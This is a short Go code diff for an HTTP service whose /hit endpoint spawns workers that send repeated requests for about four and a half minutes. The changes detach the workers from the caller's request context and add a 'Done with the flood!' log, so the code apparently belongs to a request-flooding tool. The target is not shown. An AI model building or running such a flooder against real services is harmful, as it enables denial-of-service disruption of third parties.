@@ -12,6 +12,8 @@ import (
 	"slices"
 	"sync"
 	"time"
+
+	"github.com/joho/godotenv"
 )
 
 const numWorkers = 4
@@ -72,8 +74,6 @@ func Send(wg *sync.WaitGroup, timeout context.Context, client *http.Client, allo
 			res.Body.Close()
 			if !slices.Contains(allowedCodes, res.StatusCode) {
 				return
-			} else {
-				log.Printf("Sent a request (code %d)!\n", res.StatusCode)
 			}
 		}
 	}
@@ -96,7 +96,7 @@ func HandleRequest(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte("Got it!"))
 
 	go func() {
-		timeout, cancel := context.WithTimeout(r.Context(), 4*time.Minute+30*time.Second)
+		timeout, cancel := context.WithTimeout(context.Background(), 4*time.Minute+30*time.Second)
 		defer cancel()
 		defer func() { <-limiter }()
 
@@ -105,6 +105,7 @@ func HandleRequest(w http.ResponseWriter, r *http.Request) {
 			go Send(&wg, timeout, client, allowedCodes)
 		}
 		wg.Wait()
+		log.Println("Done with the flood!")
 	}()
 }
 
@@ -114,6 +115,7 @@ func HandleIndex(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
+	_ = godotenv.Load()
 	http.HandleFunc("/hit", HandleRequest)
 	http.HandleFunc("/", HandleIndex)
 
